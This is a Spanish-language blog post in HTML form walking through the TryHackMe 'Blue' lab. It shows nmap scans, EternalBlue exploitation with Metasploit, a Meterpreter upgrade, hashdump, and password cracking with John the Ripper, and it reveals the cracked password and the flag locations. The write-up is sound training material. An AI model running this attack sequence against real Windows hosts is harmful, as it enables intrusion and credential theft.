@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            Blue  &ndash;
+        
+        K3ssDev
+:/var/log$  
+    </title>
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://k3ssdev.github.io/css/styles.c5c0ca1ad04162d8cbbaa1291d7d0e5d96b9ad04a6b2b68c8ed577d7eabb970ab79d33477f3b13c760eed232f5f642bdcbce1f28bf3f057c36edf5e6c41d203c.css integrity="sha512-xcDKGtBBYtjLuqEpHX0OXZa5rQSmsraMjtV31&#43;q7lwq3nTNHfzsTx2Du0jL19kK9y84fKL8/BXw27fXmxB0gPA==" />
+<meta name="author" content="Alberto Pérez" />
+
+    
+        <meta name="keywords" content='“Meterpreter”, “Reverse Shell”, “Windows&#34;, Easy, Enumeration, Metasploit, Password Attacks, Privilege Escalation, Privilege Escalation, Vulnerability Exploitation' />
+    
+    
+        <meta name="description" content=" artículo, compartiré mi experiencia al hackear una máquina Windows en un entorno controlado, lo que me permitió aprender valiosas lecciones sobre seguridad informática y pruebas de penetración. Los siguientes son mis apuntes detallados sobre los pasos que seguí para completar la tarea." />
+    
+
+<meta property="og:site_name"
+    content='K3ssDev
+:/var/log$  ' />
+
+    <meta property="og:title" content="Blue" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Alberto Pérez" />
+    <meta
+        property="article:published_time"
+        content='2023-08-27T00:00:00Z&#43;0000' />
+    
+        
+            <meta property="article:tag" content="“Meterpreter”" />
+        
+            <meta property="article:tag" content="“Reverse Shell”" />
+        
+            <meta property="article:tag" content="“Windows&#34;" />
+        
+            <meta property="article:tag" content="Easy" />
+        
+            <meta property="article:tag" content="Enumeration" />
+        
+            <meta property="article:tag" content="Metasploit" />
+        
+            <meta property="article:tag" content="Password Attacks" />
+        
+            <meta property="article:tag" content="Privilege Escalation" />
+        
+            <meta property="article:tag" content="Privilege Escalation" />
+        
+            <meta property="article:tag" content="Vulnerability Exploitation" />
+        
+    
+    <meta property="og:url" content="https://k3ssdev.github.io/posts/blue/" />
+    <meta property="og:image"
+        content='https://k3ssdev.github.io/images/post_pics/blue/blue.png
+        ' />
+    
+        <meta property="og:description" content="Introducción En este artículo, compartiré mi experiencia al hackear una máquina Windows en un entorno controlado, lo que me permitió aprender valiosas lecciones" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='k3ssdev.github.io'
+/>
+<meta property="twitter:url" content="https://k3ssdev.github.io/posts/blue/" />
+
+
+    <meta name="twitter:title" content="Blue" />
+    
+    <meta name="twitter:image"
+        content='https://k3ssdev.github.io/images/post_pics/blue/blue.png
+        ' />
+    
+        <meta name="twitter:description" content="Introducción En este artículo, compartiré mi experiencia al hackear una máquina Windows en un entorno controlado, lo que me permitió aprender valiosas lecciones" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' />
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">K3ssDev
+:/var/log$  </a>
+                        
+                    </h1>
+                    
+                        <label id="hamburger-menu" for="main-nav-toggler">
+                            &#xf85b;
+                        </label>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="mailto:k3ssdev@proton.me">
+    
+    
+        &#xf6ed;
+    
+    <span>
+        Email
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://www.linkedin.com/in/alberto-perez-del-rio/">
+    
+    
+        &#xf0e1;
+    
+    <span>
+        Linkedin
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/k3ssdev">
+    
+    
+        &#xf09b;
+    
+    <span>
+        Github
+    </span>
+</a>
+
+    </div>
+    
+        <div id="sidebar_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+        
+    
+<script src="https://tryhackme.com/badge/1277295"></script>
+
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>Blue</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2023-08-27
+
+</p>
+    
+    
+    
+        <figure style="margin: 0">
+            <img src="/images/post_pics/blue/blue.png" alt="" />
+            
+        </figure>
+    
+    
+    <div><h2 id="introducción">Introducción</h2>
+<p>En este artículo, compartiré mi experiencia al hackear una máquina Windows en un entorno controlado, lo que me permitió aprender valiosas lecciones sobre seguridad informática y pruebas de penetración. Los siguientes son mis apuntes detallados sobre los pasos que seguí para completar la tarea.</p>
+<h2 id="task-1---reconocimiento">Task 1 - Reconocimiento</h2>
+<h3 id="paso-1-escaneo-de-red">Paso 1: Escaneo de Red</h3>
+<ul>
+<li>Utilicé Nmap para escanear la red y encontrar hosts disponibles.</li>
+<li>Identifiqué el objetivo como <code>10.10.185.150</code>.</li>
+</ul>
+<p>Comando Nmap:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sn 10.10.185.0/24
+</span></span></code></pre></div><h3 id="paso-2-enumeración-de-puertos">Paso 2: Enumeración de Puertos</h3>
+<ul>
+<li>Realicé un escaneo de puertos con Nmap para identificar los puertos abiertos.</li>
+<li>Descubrí que el puerto 445 (SMB) estaba abierto en el objetivo.</li>
+</ul>
+<p>Comando Nmap:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- 10.10.185.150
+</span></span></code></pre></div><h2 id="task-2---explotación">Task 2 - Explotación</h2>
+<h3 id="paso-3-identificación-de-vulnerabilidad">Paso 3: Identificación de Vulnerabilidad</h3>
+<ul>
+<li>Investigé la vulnerabilidad MS17-010 y su explotación potencial.</li>
+<li>Decidí utilizar el módulo &ldquo;ms17_010_eternalblue&rdquo; de Metasploit.</li>
+</ul>
+<p>Herramienta Metasploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use windows/smb/ms17_010_eternalblue
+</span></span></code></pre></div><h3 id="paso-4-explotación">Paso 4: Explotación</h3>
+<ul>
+<li>Configuré Metasploit con mi dirección IP como host.</li>
+<li>Ejecuté el exploit para obtener acceso al sistema objetivo.</li>
+<li>¡Obtuve una shell en el sistema objetivo!</li>
+</ul>
+<p>Comandos Metasploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set RHOSTS 10.10.185.150
+</span></span><span style="display:flex;"><span>set LHOST &lt;mi dirección IP&gt;
+</span></span><span style="display:flex;"><span>exploit
+</span></span></code></pre></div><h2 id="task-3---escalamiento-de-privilegios">Task 3 - Escalamiento de Privilegios</h2>
+<h3 id="paso-5-escalamiento-de-privilegios">Paso 5: Escalamiento de Privilegios</h3>
+<ul>
+<li>Exploré cómo aumentar mis privilegios y convertir mi shell en una sesión de Meterpreter.</li>
+<li>Utilicé el módulo &ldquo;shell_to_meterpreter&rdquo; de Metasploit para lograrlo.</li>
+</ul>
+<p>Comandos Metasploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use post/multi/manage/shell_to_meterpreter
+</span></span><span style="display:flex;"><span>set SESSION &lt;número de sesión&gt;
+</span></span><span style="display:flex;"><span>exploit
+</span></span></code></pre></div><h2 id="task-4---descifrando-contraseñas">Task 4 - Descifrando Contraseñas</h2>
+<h3 id="paso-6-extracción-de-contraseñas">Paso 6: Extracción de Contraseñas</h3>
+<ul>
+<li>Con Meterpreter, ejecuté el comando &ldquo;hashdump&rdquo; para extraer las contraseñas almacenadas en el sistema.</li>
+</ul>
+<p>Comando Meterpreter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashdump
+</span></span></code></pre></div><h3 id="paso-7-descifrando-contraseña">Paso 7: Descifrando Contraseña</h3>
+<ul>
+<li>Copié el hash de contraseña de un usuario no predeterminado y utilicé John the Ripper para descifrarlo.</li>
+<li>La contraseña descifrada resultante fue &ldquo;alqfna22&rdquo;.</li>
+</ul>
+<p>Comandos John the Ripper:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hashdump.txt --format<span style="color:#f92672">=</span>NT
+</span></span></code></pre></div><h2 id="task-5---búsqueda-de-banderas">Task 5 - Búsqueda de Banderas</h2>
+<h3 id="paso-8-búsqueda-de-banderas">Paso 8: Búsqueda de Banderas</h3>
+<ul>
+<li>Utilicé el comando &ldquo;search&rdquo; en Meterpreter para encontrar las ubicaciones de las banderas en el sistema.</li>
+<li>Descubrí las siguientes banderas:
+<ul>
+<li><code>c:\\flag1.txt</code> (ubicada en la raíz del sistema)</li>
+<li><code>c:\\Windows\\System32\\config\\flag2.txt</code> (ubicada en la carpeta de configuración)</li>
+<li><code>c:\\Users\\Jon\\Documents\\flag3.txt</code> (ubicada en la carpeta de documentos de un usuario)</li>
+</ul>
+</li>
+</ul>
+<p>Comando Meterpreter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>search -f flag*.txt
+</span></span></code></pre></div><h3 id="paso-9-exploración-de-banderas">Paso 9: Exploración de Banderas</h3>
+<ul>
+<li>Usé comandos como &ldquo;cat&rdquo; para mostrar el contenido de las banderas y encontrar las respuestas a las preguntas planteadas.</li>
+</ul>
+<p>Comando Meterpreter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat c:<span style="color:#ae81ff">\\</span>flag1.txt
+</span></span></code></pre></div><h2 id="conclusión">Conclusión</h2>
+<p>Se trata de una máquina muy sencilla, ya que se cubren los aspectos clave de la enumeración, la explotación de vulnerabilidades, el escalamiento de privilegios, la extracción y el descifrado de contraseñas, y la búsqueda de ficheros en sistemas Windows.</p>
+<h2 id="-hack-the-planet">(◕‿‿◕) Hack the planet!</h2>
+</div>
+</article>
+
+    
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/meterpreter">#“Meterpreter”</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/reverse-shell">#“Reverse Shell”</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/windows">#“Windows&#34;</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/easy">#Easy</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/enumeration">#Enumeration</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/metasploit">#Metasploit</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/password-attacks">#Password Attacks</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/privilege-escalation">#Privilege Escalation</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/privilege-escalation">#Privilege Escalation</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/vulnerability-exploitation">#Vulnerability Exploitation</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+
+<p><small>
+        2023 &copy; Licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0/">Creative Commons Attribution 4.0 International License</a>.
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
